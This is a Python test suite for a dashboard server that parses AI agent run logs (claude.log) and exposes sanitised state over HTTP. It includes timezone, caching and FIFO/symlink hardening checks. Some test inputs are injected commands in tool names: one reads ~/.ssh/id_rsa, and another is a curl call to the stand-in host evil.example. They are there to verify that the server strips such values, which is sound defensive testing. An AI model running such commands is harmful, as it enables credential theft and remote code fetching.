"""Lite 0.3.0 (ADR-013): fim da execução (claude.log), título do separador, «interrompida», espera, falhas_exec,
today.inicio/intervalos, terminal em 1.º plano e extras por agente no /api/state (CA-10, 12, 16…22, 29, 30, 45…47).
Só stdlib; dados falsos em pasta temporária; NOW fixo."""
import hashlib
import http.client
import json
import os
import tempfile
import threading
import unittest
import unittest.mock
from datetime import date, datetime, timedelta, timezone
from http.server import ThreadingHTTPServer
from pathlib import Path

import quadro
import server
from tests import cfg
from tests import fake
from tests import test_server as base
from tests.fake import CRED, SESSAO_FIM as SESSAO, TOOLU, recusa, result_line as result
from tests.test_live import LiveBase

OFFICE_CFG = cfg.LEGADO

NOW = base.NOW
SEGREDO = fake.SEGREDO_FIM
PR = "https://github.com/exemplo-org/app/pull/{}"
CHAVES = json.loads((Path(__file__).with_name("estado_chaves.json")).read_text(encoding="utf-8"))


def naive(age_s: float) -> str:
    # hora como o runner a grava (UTC, sem fuso)
    return datetime.fromtimestamp(NOW - age_s, timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")


# --- B1: leitura e sanitização do fim (CA-16, CA-18) ---
class FimTest(unittest.TestCase):
    def test_ca16_caso_real(self):
        d = json.loads(result(permission_denials=[recusa()]))
        self.assertEqual(server._fim(d), {"recusas": 1, "ferramentas": ["Bash"], "erro": False, "motivo": "completed",
                                          "http": None})

    def test_ca18_so_cinco_chaves_e_nada_da_linha(self):
        out = server._fim(json.loads(result(permission_denials=[recusa(), recusa("Edit")])))
        self.assertEqual(set(out), {"recusas", "ferramentas", "erro", "motivo", "http"})
        txt = json.dumps(out)
        for s in (SEGREDO, CRED, SESSAO, TOOLU, "tool_input", "command"):
            self.assertNotIn(s, txt)

    def test_ca16_nomes_invalidos_sao_outra(self):
        maus = ["Bash $(cat ~/.ssh/id_rsa)", "nome com espaço", "a" * 65, "", "x/y", 5, None]
        pd = [{"tool_name": n, "tool_input": {"command": SEGREDO}} for n in maus] + ["não é dict", 7]
        out = server._fim({"permission_denials": pd})
        self.assertEqual((out["recusas"], out["ferramentas"]), (9, ["outra"]))
        self.assertNotIn("ssh", json.dumps(out))

    def test_ca16_distintos_ordem_e_maximo_5(self):
        nomes = ["Bash", "Edit", "Bash", "mcp__gh:x.y-z", "Write", "WebFetch", "Read", "Glob"]
        out = server._fim({"permission_denials": [{"tool_name": n} for n in nomes]})
        self.assertEqual(out["recusas"], 8)
        self.assertEqual(out["ferramentas"], ["Bash", "Edit", "mcp__gh:x.y-z", "Write", "WebFetch"])
        self.assertEqual(server._fim({"permission_denials": [{"tool_name": "a" * 64}]})["ferramentas"], ["a" * 64])

    def test_ca16_permission_denials_nao_lista(self):
        for v in (None, {}, "Bash", 3):
            with self.subTest(v=v):
                out = server._fim({"permission_denials": v})
                self.assertEqual((out["recusas"], out["ferramentas"]), (0, []))
        self.assertEqual(server._fim({})["recusas"], 0)

    def test_ca16_motivo(self):
        for v, esperado in (("completed", "completed"), ("api_error", "api_error"), ("a" * 40, "a" * 40),
                            ("a" * 41, "outro"), ("Api-Error", "outro"), ("erro grave", "outro"), ("", "outro"),
                            (5, "outro"), ([], "outro"), (None, None)):
            with self.subTest(v=v):
                self.assertEqual(server._fim({"terminal_reason": v})["motivo"], esperado)
        self.assertIsNone(server._fim({})["motivo"])

    def test_ca16_http_e_erro(self):
        for v, esperado in ((429, 429), (100, 100), (599, 599), (99, None), (600, None), (True, None),
                            ("429", None), (429.0, None), (None, None)):
            with self.subTest(v=v):
                self.assertEqual(server._fim({"api_error_status": v})["http"], esperado)
        for v, esperado in ((True, True), (False, False), ("true", False), (1, False), (None, False)):
            with self.subTest(erro=v):
                self.assertEqual(server._fim({"is_error": v})["erro"], esperado)


class LogScanTest(unittest.TestCase):
    # CA-16, CA-19
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.log = Path(self.tmp.name) / "claude.log"
        server._log_cache.clear()

    def tearDown(self):
        server._log_cache.clear()
        self.tmp.cleanup()

    def test_ca16_ultima_linha_manda_e_custo_igual(self):
        # o --resume sem recusas limpa as anteriores; custo/turnos/duração como antes
        self.log.write_text("texto livre\n" + result(permission_denials=[recusa()], total_cost_usd=1.0, num_turns=2,
                                                     duration_ms=1000)
                            + result(total_cost_usd=2.5, num_turns=3, duration_ms=2000))
        self.assertEqual(server._log_result(self.log), (2.5, 5, 3.0))
        self.assertEqual(server._log_fim(self.log)["recusas"], 0)
        self.assertEqual(server._log_scan(self.log)[:3], server._log_result(self.log))

    def test_ca16_linha_truncada_e_json_invalido(self):
        self.log.write_text(result(permission_denials=[recusa()]) + '{"type": "result", "permission_denials": [{"to'
                            + "\n[1, 2]\nnull\n\"result\"\n")
        self.assertEqual(server._log_fim(self.log)["ferramentas"], ["Bash"])
        self.log.write_text('{"type": "result", "permission_denials": [{"to')   # só truncada
        self.assertIsNone(server._log_fim(self.log))

    def test_ca16_sem_ficheiro_ou_sem_result(self):
        self.assertIsNone(server._log_fim(self.log))
        self.log.write_text('{"type": "assistant"}\n')
        self.assertIsNone(server._log_fim(self.log))
        self.assertEqual(server._log_result(self.log), (None, None, None))

    def test_ca16_cache_muda_com_o_ficheiro(self):
        self.log.write_text(result())
        self.assertEqual(server._log_fim(self.log)["recusas"], 0)
        with self.log.open("a") as f:
            f.write(result(permission_denials=[recusa(), recusa()]))
        self.assertEqual(server._log_fim(self.log)["recusas"], 2)

    def test_ca19_json_muito_aninhado_nao_rebenta(self):
        self.log.write_text(result(permission_denials=[recusa()]) + '"result"' + "[" * 200000 + "\n")
        self.assertEqual(server._log_fim(self.log)["recusas"], 1)

    def test_ca19_fifo_e_symlink_ignorados_sem_bloquear(self):
        os.mkfifo(self.log)
        out = []
        th = threading.Thread(target=lambda: out.append((server._log_fim(self.log), server._log_result(self.log))),
                              daemon=True)
        th.start()
        th.join(5)
        self.assertFalse(th.is_alive(), "o FIFO pendurou a leitura")
        self.assertEqual(out, [(None, (None, None, None))])
        self.log.unlink()
        alvo = Path(self.tmp.name) / "outro.log"
        alvo.write_text(result(permission_denials=[recusa()]))
        self.log.symlink_to(alvo)
        self.assertIsNone(server._log_fim(self.log))
        self.log.unlink()
        self.log.mkdir()
        self.assertIsNone(server._log_fim(self.log))

    def test_ca19_linha_result_maior_que_64_kb(self):
        # muitas recusas: a linha passa dos 64 KB e fica cortada no início da janela; relê-se com 1 MiB
        antiga = result(total_cost_usd=1.0)
        grande = result(permission_denials=[recusa()] * 3000, total_cost_usd=2.0)
        self.assertGreater(len(grande), server.LOG_TAIL)
        self.assertLess(len(grande), server.LOG_TAIL_MAX)
        self.log.write_text(antiga + grande + '{"type": "system"}\n')
        self.assertEqual(server._log_fim(self.log)["recusas"], 3000)
        self.assertEqual(server._log_result(self.log)[0], 2.0)

    def _leituras(self, *args):
        # tamanhos pedidos ao read() durante um _log_scan
        lidos, real = [], os.fdopen

        def spy(fd, *a, **kw):
            f = real(fd, *a, **kw)
            ler = f.read
            f.read = lambda n=-1: lidos.append(n) or ler(n)
            return f
        with unittest.mock.patch.object(server.os, "fdopen", spy):
            out = server._log_scan(self.log, *args)
        return out, lidos

    def test_a_correr_sem_releitura_de_1_mib(self):
        # tarefa a correr: o claude.log cresce sem linha result; cada build só lê os 64 KB
        self.log.write_text(result(total_cost_usd=1.0) + '{"type": "assistant", "x": "' + "y" * 200_000 + '"}\n')
        for _ in range(2):
            with self.log.open("a") as f:
                f.write('{"type": "assistant"}\n')
            out, lidos = self._leituras(True)
            self.assertEqual(lidos, [server.LOG_TAIL])
            self.assertEqual(out, (None, None, None, None))
        # acabou (mesmo ficheiro): a cache parcial não serve; relê com 1 MiB e encontra a linha result
        out, lidos = self._leituras(False)
        self.assertEqual(lidos, [server.LOG_TAIL, server.LOG_TAIL_MAX])
        self.assertEqual(out[0], 1.0)
        self.assertEqual(self._leituras(False)[1], [])   # agora em cache
        self.assertEqual(self._leituras(True), (out, []))   # a cache completa também serve a quem corre

    def test_a_correr_com_result_nos_64_kb_igual(self):
        self.log.write_text(result(total_cost_usd=3.0, num_turns=2, duration_ms=1000))
        self.assertEqual(server._log_result(self.log, True), (3.0, 2, 1.0))

class LogDeliveryTest(unittest.TestCase):
    # reader.log_delivery (leitor e /api/entregas): endurecido como o _log_scan
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_fifo_symlink_pasta_e_falta(self):
        os.mkfifo(self.d / "fifo.log")
        self.assertIsNone(server._log_delivery(self.d / "fifo.log"))
        base.write(self.d / "real.log", result(result="ok"))
        os.symlink(self.d / "real.log", self.d / "link.log")
        self.assertIsNone(server._log_delivery(self.d / "link.log"))
        self.assertEqual(server._log_delivery(self.d / "real.log"), "ok")
        self.assertIsNone(server._log_delivery(self.d / "nao-existe.log"))
        (self.d / "pasta.log").mkdir()
        self.assertIsNone(server._log_delivery(self.d / "pasta.log"))

    def test_aninhado_e_so_o_fim(self):
        base.write(self.d / "fundo.log", "[" * 100000 + "\n" + result(result="depois do aninhado"))
        self.assertEqual(server._log_delivery(self.d / "fundo.log"), "depois do aninhado")
        base.write(self.d / "grande.log",
                   result(result="antiga") + "x" * server.LOG_TAIL + "\n" + result(result="nova"))
        self.assertEqual(server._log_delivery(self.d / "grande.log"), "nova")


# --- build_state ---
class EstadoBase(unittest.TestCase):
    def setUp(self):
        base.ServerTest.setUp(self)
        root = Path(self.tmp.name)
        self.apr, self.fila = root / "aprovacoes", root / "fila"
        self.apr.mkdir()
        self.old_apr = (server.APROVACOES, server.FILA)
        server.APROVACOES, server.FILA = {"geral": self.apr}, self.fila
        server._live.clear()
        server._seen.clear()
        server._feed.clear()

    def tearDown(self):
        server.APROVACOES, server.FILA = self.old_apr
        server._live.clear()
        server._feed.clear()
        base.ServerTest.tearDown(self)

    def dev(self, tid, log=None, status="concluída", fin_age=3600, pr="", **kw):
        m = {"id": tid, "project": "joga", "mode": "goal", "status": status, "branch": "feat/x", "pr": pr,
             "started_at": naive(fin_age + 600), "finished_at": naive(fin_age), "cost_usd": 1.0, **kw}
        if status == "a correr" or m["finished_at"] is None:
            del m["finished_at"]
        base.write_json(self.tasks / tid / "meta.json", m)
        if log is not None:
            base.write(self.tasks / tid / "claude.log", log)

    def sessao(self, tid, status="concluída", fin_age=3600, squad="marketing", **kw):
        m = {"id": tid, "project": squad, "mode": "diario", "squad": squad, "status": status,
             "started_at": naive(fin_age + 600), "finished_at": naive(fin_age), **kw}
        if status == "a correr":
            del m["finished_at"]
        base.write_json(self.squads / squad / tid / "meta.json", m)

    def pedido(self, nome, criado="2026-11-10"):
        base.write(self.apr / nome, f"---\nestado: pendente\ncriado: {criado}\nproduto: ebook\n---\n# Pedido {nome}\n\n"
                                    "## O quê\nx\n\n## Decisões\n- [P1] decide isto\n")

    def state(self):
        return server.build_state(NOW)

    def task(self, st, tid):
        return next(t for t in st["tasks"] if t["id"] == tid)


class FimEstadoTest(EstadoBase):
    def test_ca16_quando_ha_fim(self):
        mau = result(permission_denials=[recusa()], terminal_reason="api_error")
        self.dev("T-corre", mau, status="a correr")                    # a correr: result de uma execução anterior
        self.dev("T-velha", mau, fin_age=server.AGENTS_S + 60)         # > 3 dias
        self.dev("T-sem-log", None)                                    # sem claude.log
        self.dev("T-sem-fim", mau, finished_at=None)                   # sem finished_at
        self.dev("T-lixo", "não é json\n{\"type\": \"result\", \"perm")   # só lixo e linha truncada
        self.dev("T-ok", result(permission_denials=[recusa()]))        # com custo na meta: lê-se na mesma
        self.sessao("M1")
        base.write(self.squads / "marketing" / "M1" / "claude.log", mau)   # sessão: nunca se lê
        st = self.state()
        fims = {t["id"]: t["fim"] for t in st["tasks"]}
        for tid in ("T-corre", "T-velha", "T-sem-log", "T-sem-fim", "T-lixo", "M1"):
            with self.subTest(tid=tid):
                self.assertIsNone(fims[tid])
        self.assertEqual(fims["T-ok"], {"recusas": 1, "ferramentas": ["Bash"], "erro": False, "motivo": "completed",
                                        "http": None})

    def test_ca21_titulo(self):
        self.dev("T-h1", task="Contexto\n# Separadores   no\tinfo\n# Outro")
        self.dev("T-meta", titulo="Título da meta")
        self.dev("T-h1-ganha", task="# Do task", titulo="Da meta")
        self.dev("T-nada", task="sem cabeçalho")
        self.dev("T-mau", task=5, titulo=["x"])
        self.dev("T-longo", task="# " + "palavra " * 40)
        tok = fake.gh_token()
        self.dev("T-segredo", task=f"# Usar GITHUB_TOKEN={tok} no deploy")
        self.sessao("M-tit", titulo="Relatório diário")
        st = self.state()
        tit = {t["id"]: t["titulo"] for t in st["tasks"]}
        self.assertEqual(tit["T-h1"], "Separadores no info")
        self.assertEqual(tit["T-meta"], "Título da meta")
        self.assertEqual(tit["T-h1-ganha"], "Do task")
        self.assertIsNone(tit["T-nada"])
        self.assertIsNone(tit["T-mau"])
        self.assertEqual(len(tit["T-longo"]), 120)
        self.assertEqual(tit["M-tit"], "Relatório diário")
        self.assertIn("[segredo]", tit["T-segredo"])
        self.assertNotIn(tok, json.dumps(st))


# --- HTTP: segredos do claude.log e «interrompida» no Quadro (CA-18, CA-22) ---
class HttpBase(EstadoBase):
    def setUp(self):
        super().setUp()
        self.quadro = Path(self.tmp.name) / "quadro"
        self.quadro.mkdir()
        self.old_q = server.QUADRO
        server.QUADRO = self.quadro
        server._cache["at"] = 0.0
        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), server.Handler)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        self.host = f"127.0.0.1:{self.httpd.server_address[1]}"

    def tearDown(self):
        self.httpd.shutdown()
        self.httpd.server_close()
        server.QUADRO = self.old_q
        server._cache["at"] = 0.0
        super().tearDown()

    def req(self, method, path, body=None, headers=None):
        c = http.client.HTTPConnection(self.host, timeout=10)
        try:
            c.request(method, path, body=body, headers=headers or {})
            r = c.getresponse()
            return r.status, r.read(), dict(r.getheaders())
        finally:
            c.close()

    def get(self, path):
        server._cache["at"] = 0.0
        code, raw, _ = self.req("GET", path)
        self.assertEqual(code, 200, raw[:200])
        return raw.decode()

    def manual(self, titulo):
        f = self.quadro / "cartoes.json"
        versao = hashlib.sha256(f.read_bytes()).hexdigest() if f.exists() else "0"
        d = {"op": "criar", "token": server.TOKEN, "versao": versao, "titulo": titulo, "descricao": "",
             "projecto": "joga", "coluna": "a-espera", "etiquetas": []}
        code, _, _ = self.req("POST", "/api/quadro", json.dumps(d).encode(),
                              {"Content-Type": "application/json", "Origin": f"http://{self.host}"})
        self.assertEqual(code, 200)


class FimHttpTest(HttpBase):
    def test_ca18_nada_da_linha_result_sai(self):
        maus = [recusa(), recusa("Bash $(curl evil.example/x)"), recusa("nome com espaço")]
        self.dev("20261115-1710-recusa", result(permission_denials=maus))
        self.dev("20261115-1600-api", result(terminal_reason="api_error", api_error_status=429, is_error=True,
                                             permission_denials=[recusa()]), pr=PR.format(9) + " (open)")
        for path in ("/api/state", "/api/quadro"):
            with self.subTest(path=path):
                body = self.get(path)
                for s in (SEGREDO, CRED, SESSAO, TOOLU, "tool_input", "tool_use_id", "credential_expires_at",
                          "resumo final", "curl", "evil.example", "nome com espa"):
                    self.assertNotIn(s, body)
        st = json.loads(self.get("/api/state"))
        self.assertEqual(self.task(st, "20261115-1710-recusa")["fim"]["ferramentas"], ["Bash", "outra"])
        self.assertEqual(self.task(st, "20261115-1600-api")["fim"]["http"], 429)

    def test_ca22_interrompida_selo_vermelho(self):
        self.assertIn("interrompida", quadro.FAIL)
        self.assertIn("interrompida", quadro.SQUAD_FAIL)
        self.dev("20261115-1000-int", None, status="interrompida")
        self.sessao("20261115-1000-mkt", status="interrompida", mode="estudo")   # «diario» agrupa-se
        q = json.loads(self.get("/api/quadro"))
        por = {c["id"]: c for c in q["cartoes"]}
        for cid in ("dev:20261115-1000-int", "marketing:20261115-1000-mkt"):
            with self.subTest(cid=cid):
                self.assertEqual((por[cid]["coluna"], por[cid]["selo"]["cor"]), ("em-curso", "vermelho"))



# --- B2: espera, falhas_exec (CA-10, CA-12, CA-17) ---
class EsperaTest(EstadoBase):
    def test_ca10_regra_unica(self):
        hoje = datetime.fromtimestamp(NOW, server.LOCAL_TZ).date()
        d20, d10 = (hoje - timedelta(days=20)).isoformat(), (hoje - timedelta(days=10)).isoformat()
        self.pedido("b.md", d10)
        self.pedido("a.md", d20)
        base.write(self.apr / "fechado.md", "---\nestado: pendente\ncriado: 2026-11-01\n---\n# F\n\n## Decisões\n"
                                            "- [P1] x → aprovado (2026-11-02)\n")
        self.dev("T-pr", result(), pr=PR.format(1) + " (open)", fin_age=5 * 86400)          # fora dos 3 d: conta
        self.dev("T-draft", None, status="parcial (PR draft)", pr=PR.format(2) + " (open, draft)", fin_age=7200)
        self.dev("T-recusa", result(permission_denials=[recusa(), recusa("Edit")]), fin_age=1800)   # não conta
        self.dev("T-merged", result(), pr=PR.format(4) + " (merged)", fin_age=600)
        self.dev("T-dry-pr", result(), pr=PR.format(5) + " (open)", mode="dry-run")
        self.dev("T-limpa", result())
        st = self.state()
        itens = st["espera"]["itens"]
        self.assertEqual(st["espera"]["n"], len(itens))
        self.assertEqual([i["chave"] for i in itens], ["apr:geral/a.md", "apr:geral/b.md", "pr:dev/T-pr",
                                                       "pr:dev/T-draft"])   # mais antigo primeiro
        por = {i["chave"]: i for i in itens}
        self.assertEqual(por["apr:geral/a.md"], {
            "tipo": "aprovacao", "chave": "apr:geral/a.md", "fonte": "geral", "ficheiro": "a.md",
            "titulo": "Pedido a.md", "criado": d20, "idade_dias": 20, "abertas": 1,
            "desde": datetime.combine(date.fromisoformat(d20), datetime.min.time(), server.LOCAL_TZ).isoformat()})
        fin = server._iso_local(naive(7200))
        self.assertEqual(por["pr:dev/T-draft"], {
            "tipo": "pr", "chave": "pr:dev/T-draft", "id": "T-draft", "squad": "dev", "project": "joga",
            "pr_url": PR.format(2), "draft": True, "finished": fin, "desde": fin})
        self.assertIn("T-dry-pr", [w["id"] for w in st["waiting"]])   # waiting igual a hoje
        self.assertNotIn("recusa", json.dumps(st["espera"]))

    def test_ca10_sem_data_no_fim_e_vazio(self):
        self.assertEqual(self.state()["espera"], {"n": 0, "itens": []})
        out = server._espera([{"fonte": "geral", "ficheiro": "x.md", "abertas": 1, "criado": None},
                              {"fonte": "geral", "ficheiro": "y.md", "abertas": 0, "criado": "2026-11-01"},
                              {"fonte": 5, "ficheiro": "z.md", "abertas": 1, "criado": "2026-11-01"}],
                             [{"id": "T", "squad": "dev", "project": None, "pr_url": PR.format(1), "draft": False,
                               "finished": "2026-11-02T10:00:00+00:00"}])
        self.assertEqual([(i["chave"], i["desde"]) for i in out["itens"]],
                         [("pr:dev/T", "2026-11-02T10:00:00+00:00"), ("apr:geral/x.md", None)])

    def test_ca17_falhas_exec(self):
        self.dev("T-ok", result(), fin_age=600)
        self.dev("T-erro", None, status="erro", fin_age=1200)
        self.dev("T-incompleta", result(terminal_reason="max_turns"), status="incompleta", fin_age=1800)
        self.dev("T-api", result(is_error=True, terminal_reason="api_error", api_error_status=529), fin_age=2400)
        self.dev("T-motivo", result(terminal_reason="Coisa Estranha"), fin_age=3000)   # sem erro: não conta
        self.dev("T-velha", None, status="erro", fin_age=server.AGENTS_S + 60)
        self.dev("T-dry", result(is_error=True), status="erro", mode="dry-run", fin_age=600)
        self.dev("T-corre", result(is_error=True), status="a correr")
        self.sessao("M-falhou", status="falhou", fin_age=3600)
        self.sessao("M-int", status="interrompida", fin_age=4200, mode="estudo")
        self.sessao("M-ok", fin_age=600)
        limpo = server.build_state(NOW)["alerts"]
        st = self.state()
        self.assertEqual(st["alerts"], limpo)
        self.assertEqual([f["id"] for f in st["falhas_exec"]],
                         ["T-erro", "T-incompleta", "T-api", "M-falhou", "M-int"])   # mais recente primeiro
        por = {f["id"]: f for f in st["falhas_exec"]}
        self.assertEqual(por["T-api"], {"id": "T-api", "squad": "dev", "project": "joga", "status": "concluída",
                                        "motivo": "api_error", "http": 529, "erro": True,
                                        "finished": server._iso_local(naive(2400))})
        self.assertEqual(por["T-incompleta"]["motivo"], "max_turns")
        self.assertEqual({k: por["M-falhou"][k] for k in ("squad", "status", "motivo", "http", "erro")},
                         {"squad": "marketing", "status": "falhou", "motivo": None, "http": None, "erro": False})
        self.assertEqual({k: por["T-erro"][k] for k in ("motivo", "http", "erro")},
                         {"motivo": None, "http": None, "erro": False})   # sem claude.log
        self.assertEqual(self.task(st, "T-motivo")["fim"]["motivo"], "outro")


# --- B2: today.inicio e today.intervalos num dia de mudança de hora (CA-29, CA-30) ---
class TodayTest(EstadoBase):
    DIA = date(2026, 10, 25)   # Europe/Amsterdam: o relógio atrasa às 03:00 (dia de 25 h)

    def em(self, h, mi=0, d=None):
        d = d or self.DIA
        return datetime(d.year, d.month, d.day, h, mi, tzinfo=server.LOCAL_TZ).timestamp()

    def setUp(self):
        super().setUp()
        self.agora = self.em(12)

    def meta(self, tid, ini, fin=None, status="concluída", root=None, mtime=None, **kw):
        m = {"id": tid, "project": "proj-" + tid, "mode": "goal", "status": status, "titulo": "titulo-" + tid,
             "started_at": datetime.fromtimestamp(ini, timezone.utc).strftime("%Y-%m-%dT%H:%M:%S"), **kw}
        if fin is not None:
            m["finished_at"] = datetime.fromtimestamp(fin, timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")
        path = (root or self.tasks) / tid / "meta.json"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(m))
        t = self.agora - 60 if mtime is None else mtime
        os.utime(path, (t, t))
        return path.parent

    def today(self):
        return server.build_state(self.agora)["today"]

    def test_ca30_inicio_meia_noite_no_fuso(self):
        t = self.today()
        self.assertEqual(t["inicio"], "2026-10-25T00:00:00+02:00")
        self.assertEqual(t["intervalos"], [])
        for k in ("cost_usd", "done", "hours", "top", "timeline"):   # só acrescenta
            self.assertIn(k, t)

    def test_ca30_ontem_a_cruzar_a_meia_noite_entra_ontem_inteiro_nao(self):
        ontem = self.DIA - timedelta(days=1)
        self.meta("T-cruza", self.em(23, 0, ontem), self.em(1))
        self.meta("T-ontem", self.em(10, 0, ontem), self.em(23, 59, ontem))
        self.meta("T-meia-noite", self.em(22, 0, ontem), self.em(0))   # acaba à meia-noite: entra
        ivs = self.today()["intervalos"]
        self.assertEqual(ivs, [{"squad": "dev", "ini": "2026-10-24T20:00:00+00:00", "fim": "2026-10-24T22:00:00+00:00"},
                               {"squad": "dev", "ini": "2026-10-24T21:00:00+00:00",
                                "fim": "2026-10-24T23:00:00+00:00"}])

    def test_ca30_viva_morta_parada_dry_e_sessao(self):
        ini = self.em(2, 30)   # a hora repetida da mudança
        self.meta("T-viva", ini, status="a correr")
        base_beat = self.meta("T-morreu", ini, status="a correr")
        hb = base_beat / "heartbeat"
        hb.write_text("")
        os.utime(hb, (self.agora - server.DEAD_S - 60,) * 2)
        self.meta("T-parada", ini, status="a correr", mtime=self.agora - server.STALE_S - 60)
        self.meta("T-viva-antiga", ini, self.em(1), status="a correr")   # finished_at de uma execução anterior
        self.meta("T-dry", ini, self.em(3), mode="dry-run")
        self.meta("T-dry-st", ini, self.em(3), status="dry-run")
        self.meta("M-viva", ini, status="a correr", root=self.squads / "marketing", squad="marketing")
        self.meta("T-futuro", self.agora + 60, status="a correr")
        st = server.build_state(self.agora)
        shown = {t["id"]: t["status"] for t in st["tasks"]}
        self.assertEqual((shown["T-parada"], shown["T-morreu"]), ("parada?", "morreu"))
        ivs = st["today"]["intervalos"]
        self.assertEqual(sorted(iv["squad"] for iv in ivs), ["dev", "dev", "marketing"])
        self.assertTrue(all(iv["fim"] is None for iv in ivs))

    def test_ca30_maximo_200_mais_recentes_e_por_ini(self):
        for i in range(201):
            self.meta(f"T-{i:03d}", self.em(8) + i, self.em(9))
        ivs = self.today()["intervalos"]
        self.assertEqual(len(ivs), server.INTERVALOS_N)
        ini = [datetime.fromisoformat(iv["ini"]).timestamp() for iv in ivs]
        self.assertEqual(ini, sorted(ini))
        self.assertEqual((ini[0], ini[-1]), (self.em(8) + 1, self.em(8) + 200))   # saiu o mais antigo

    def test_ca30_so_tres_chaves_e_sem_texto(self):
        self.meta("T-texto-unico", self.em(8), self.em(9), result="entrega-unica-xyz", task="# tarefa-unica-xyz")
        [iv] = self.today()["intervalos"]
        self.assertEqual(set(iv), {"squad", "ini", "fim"})
        txt = json.dumps(iv)
        for x in ("T-texto", "proj-", "titulo-", "xyz"):
            self.assertNotIn(x, txt)



# --- B3: Bash em 1.º plano (CA-20) e extras por agente (CA-45…47); NOW fixo ---
class Live(LiveBase):
    def get(self, tid="T1"):
        return next(t for t in server.build_state(NOW)["tasks"] if t["id"] == tid)


def extras(a: dict) -> dict:
    return {k: a[k] for k in ("tarefas", "linhas", "modelo", "ramo")}


class TerminalTest(Live):
    def test_ca20_primeiro_plano_tem_desde_e_preso_aos_25(self):
        for age, preso in ((11 * 60, False), (24 * 60, False), (26 * 60, True)):
            with self.subTest(age=age):
                self.reset()
                self.task(lines=fake.tool_use("u1", "Bash", {"command": f"sleep 99 # {SEGREDO}"}, age=age), age=age)
                t = self.get()
                self.assertEqual(t["lead"]["act"]["desde"], base.iso(age))
                self.assertEqual(t["lead"]["stuck"], preso)
                self.assertNotIn(SEGREDO, json.dumps(server.build_state(NOW)))

    def test_ca20_testes_em_primeiro_plano_tambem(self):
        self.task(lines=fake.tool_use("u1", "Bash", {"command": "uv run pytest"}, age=5))
        act = self.get()["lead"]["act"]
        self.assertEqual((act["kind"], act["desde"]), ("testes", base.iso(5)))

    def test_ca20_fundo_sem_desde_e_regra_de_10_min(self):
        self.task(lines=fake.tool_use("u1", "Bash", {"command": "npm run dev", "run_in_background": True}),
                  age=11 * 60)
        t = self.get()
        self.assertNotIn("desde", t["lead"]["act"])
        self.assertTrue(t["lead"]["stuck"])
        for v in ("true", 1, None):   # só True conta como fundo
            with self.subTest(v=v):
                self.reset()
                self.task(lines=fake.tool_use("u1", "Bash", {"command": "x", "run_in_background": v}))
                self.assertIn("desde", self.get()["lead"]["act"])

    def test_ca20_sem_desde_depois_do_resultado_ou_noutra_ferramenta(self):
        path = self.task(lines=fake.tool_use("u1", "Bash", {"command": "make"}))
        self.assertIn("desde", self.get()["lead"]["act"])
        self.append(path, fake.tool_result("u1"))
        self.assertNotIn("desde", self.get()["lead"]["act"])
        self.append(path, fake.tool_use("u2", "Bash") + fake.thinking())
        self.assertNotIn("desde", self.get()["lead"]["act"])
        self.append(path, fake.tool_use("u3", "Read"))
        self.assertNotIn("desde", self.get()["lead"]["act"])

    def test_ca20_subagente_tem_desde(self):
        self.task(lines=fake.tool_use("u1", "Agent"))
        self.sub("T1", "a1", fake.tool_use("s1", "Bash", {"command": "make"}, age=7))
        self.assertEqual(self.get()["agents"][0]["act"]["desde"], base.iso(7))


class TarefasTest(Live):
    def lead(self):
        return self.get()["lead"]["tarefas"]

    def test_ca45_todo_write_conta_e_vale_a_ultima(self):
        path = self.task(lines=fake.todo_write("u1", ["completed"] * 4 + ["pending", "in_progress", "pending"]))
        self.assertEqual(self.lead(), {"feitas": 4, "total": 7})
        self.append(path, fake.todo_write("u2", ["completed", "pending", "completed"]))
        self.assertEqual(self.lead(), {"feitas": 2, "total": 3})

    def test_ca45_task_create_e_update(self):
        lines = (fake.task_create("c1") + fake.task_create("c2") + fake.task_create("c3")
                 + fake.task_update("t1", "1", "completed") + fake.task_update("t2", "2", "deleted")
                 + fake.task_update("t3", "3", "in_progress"))
        path = self.task(lines=lines)
        self.assertEqual(self.lead(), {"feitas": 1, "total": 2})   # deleted sai do total
        self.append(path, fake.task_update("t4", "1", "qualquer-coisa"))
        self.assertEqual(self.lead(), {"feitas": 0, "total": 2})
        self.append(path, fake.task_update("t5", "1", "completed") + fake.task_update("t6", "3", "completed"))
        self.assertEqual(self.lead(), {"feitas": 2, "total": 2})

    def test_ca45_mecanismo_misto_vale_o_ultimo(self):
        path = self.task(lines=fake.todo_write("u1", ["completed", "pending"]))
        self.assertEqual(self.lead(), {"feitas": 1, "total": 2})
        self.append(path, fake.task_create("c1") + fake.task_create("c2") + fake.task_create("c3"))
        self.assertEqual(self.lead(), {"feitas": 0, "total": 3})
        self.append(path, fake.todo_write("u2", ["completed"] * 5))
        self.assertEqual(self.lead(), {"feitas": 5, "total": 5})

    def test_ca45_todos_que_nao_e_lista_ou_vazio_da_null(self):
        for todos in ("x", {"a": 1}, None, 5):
            with self.subTest(todos=todos):
                self.reset()
                self.task(lines=fake.todo_write("u1", ["completed"]) + fake.tool_use("u2", "TodoWrite",
                                                                                     {"todos": todos}))
                self.assertIsNone(self.lead())
        self.reset()
        self.task(lines=fake.todo_write("u1", []))
        self.assertIsNone(self.lead())

    def test_ca45_task_id_invalido_ignorado(self):
        lines = fake.task_create("c1") + fake.task_create("c2")
        for i, tid in enumerate(("../x", "a" * 41, "", "com espaço", 5, None, ["1"])):
            lines += fake.task_update(f"t{i}", tid, "deleted")
        lines += fake.tool_use("tx", "TaskUpdate", {"taskId": "1"})   # sem status: não muda nada
        self.task(lines=lines)
        self.assertEqual(self.lead(), {"feitas": 0, "total": 2})

    def test_ca45_limites(self):
        fs = server._FileState(1)
        fs.mec, fs.todo = "todo", (1500, 2000)
        self.assertEqual(server._extras(fs)["tarefas"], {"feitas": 999, "total": 999})
        fs.mec, fs.tk_n, fs.tk = "task", 1, {"a": "completed", "b": "completed", "c": "completed"}
        self.assertEqual(server._extras(fs)["tarefas"], {"feitas": 1, "total": 1})
        fs.tk = {"a": "deleted", "b": "deleted"}
        self.assertIsNone(server._extras(fs)["tarefas"])
        for i in range(2000):
            server._progresso(fs, "TaskUpdate", {"taskId": f"x{i}", "status": "completed"})
        self.assertEqual(len(fs.tk), server.TAREFAS_MAX)
